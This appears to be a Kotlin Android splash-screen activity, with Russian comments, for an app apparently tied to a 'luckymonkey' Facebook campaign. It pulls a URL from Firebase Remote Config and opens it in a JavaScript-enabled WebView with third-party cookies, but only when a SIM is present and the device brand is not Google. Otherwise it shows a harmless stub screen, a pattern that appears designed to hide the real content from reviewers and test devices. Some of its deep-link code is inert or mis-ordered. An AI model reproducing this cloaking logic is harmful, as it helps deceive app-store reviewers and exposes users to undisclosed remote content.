package com.kostlin.fragment

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.text.isDigitsOnly
import androidx.core.view.isGone
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.facebook.applinks.AppLinks
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings

class SpashScreenActivity : AppCompatActivity() {


    private var progressBar: ProgressBar? = null
    private var webView: WebView? = null

    private var _prefManager: SharedPreferencesManager? = null
    private val prefManager: SharedPreferencesManager
        get() = _prefManager!!

    //для примера линка указана уже пришедшей
    var fbLink: String = "luckymonkey://fbcampaign?sub_id_1=1111&sub_id_2=2222&sub_id_3=3333"
    var targetLink: String = "empty for now"

    fun parceJob() {
        val savedUrl = prefManager.getURL()
        val s = fbLink.split("fbcampaign").toTypedArray()
        targetLink = savedUrl + s[1]
        println(targetLink)
    }


    private fun checkFirebaseUrl() {
        //Получаем ссылку их локального хранилища
        val savedUrl = prefManager.getURL()
        //Если ссылка пустая, то обращаемя к FirebaseRemote
        if (savedUrl.isEmpty()) {
            //Настраиваем конфиг FirebaseRemote
            val remoteConfig = Firebase.remoteConfig.apply {
                setConfigSettingsAsync(remoteConfigSettings {
                    fetchTimeoutInSeconds = 30
                })
            }
            //Ставим слушатель на получение ссылки из FirebaseRemote
            remoteConfig.fetchAndActivate().addOnSuccessListener {
                //Здесь мы получили ссылку по уникальному тегу
                //Тег должен быть одинаковым в проекте и в Firebase
                val webUrl = remoteConfig.getString("FireBaseLink")


                //Проверяем, пришла пустой ответ, private policy или целевая ссылка
                if (webUrl.isEmpty()) {
                    startStub()
                    stopProgressBar()
                } else if (webUrl == "Private Policy URL") {
                    startStub()
                    stopProgressBar()
                } else {
                    //Сохраняем ссылку в локальное хранилище
                    prefManager.putURL(webUrl)
                    //Запускаем WebView
                    setWebView(webUrl)
                    stopProgressBar()
                    faceBookFetchDeepLink()
                }

            }
        } else {
            //Срабатывает если ссылка уже сохранена локально,
            //чтобы не делать повторные запросы в FirebaseRemote

            //Запускаем WebView
            setWebView(savedUrl)
            stopProgressBar()
            faceBookFetchDeepLink()
        }
    }

    private fun stopProgressBar() {
        progressBar = findViewById(R.id.pb)
        progressBar?.isGone = true
    }

    private fun setWebView(loadingUrl: String) {
        //Делаем проверку
        // 1) Вставлена ли сим-карта
        // 2) Проверяет соединение с интернетом
        if (isSIMInserted() && isRealDevice() && isNetworkAvailable()) {
            //Настраиваем WebView
            webView = findViewById(R.id.webView)
            webView!!.apply {
                CookieManager.getInstance().setAcceptThirdPartyCookies(this, true);
                settings.apply {
                    domStorageEnabled = true
                    javaScriptEnabled = true
                    useWideViewPort = true
                    databaseEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true
                    cacheMode = WebSettings.LOAD_DEFAULT
                }
                webViewClient = object : WebViewClient() {

                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)

                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true)
                        if (Uri.parse(loadingUrl).host == "" || Uri.parse(url).host == "") {
                            return
                        }
                        //Если был редирект делает webView видимым
                        if (
                            (Uri.parse(loadingUrl).host != Uri.parse(url).host) ||
                            (Uri.parse(loadingUrl).query != Uri.parse(url).query)
                        ) {
                            webView?.visibility = View.VISIBLE
                            faceBookFetchDeepLink()
                        }
                    }

                    override fun onReceivedError(
                        view: WebView?,
                        request: WebResourceRequest?,
                        error: WebResourceError?
                    ) {
                        view?.stopLoading()

                    }

                    override fun onLoadResource(view: WebView?, url: String?) {
                        super.onLoadResource(view, url)
                        CookieManager.getInstance().setAcceptThirdPartyCookies(view, true);
                    }
                }
            }
            //Запускаем загрузку WebView
            webView!!.loadUrl(loadingUrl)
            faceBookFetchDeepLink()
        } else startStub()

    }

    //Проверка на наличие сим-карты
    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    private fun isRealDevice(): Boolean {
        return !Build.BRAND.lowercase().equals("google")
    }

    //Проверка на включенный интренет
    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
                    ?: return false
            return when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            if (connectivityManager.activeNetworkInfo != null && connectivityManager.activeNetworkInfo!!.isConnectedOrConnecting) {
                return true
            }
        }
        return false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_spashscreen)

        _prefManager = SharedPreferencesManager(this)
        checkFirebaseUrl()
        parceJob()
        FacebookSdk.sdkInitialize(this)
        AppEventsLogger.activateApp(this)
        AppLinkData.fetchDeferredAppLinkData(this, object : AppLinkData.CompletionHandler {
            override fun onDeferredAppLinkDataFetched(appLinkData: AppLinkData?) {
            }
        })
    }

    private fun startStub() {

        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
        finish()


    }

    fun faceBookFetchDeepLink() {
        AppLinkData.CompletionHandler() {
            fun onDeferredAppLinkDataFetched(appLinkData: AppLinkData?) {
                //поскольку FB пока что ничего мне не присылает - мы прописываем ссылку-пример
                //    fbLink = FacebookSdk.getFacebookDomain().toString()
            }
        }
    }

    companion object {
        private const val FireBaseLink = "FireBaseLink"
    }
}
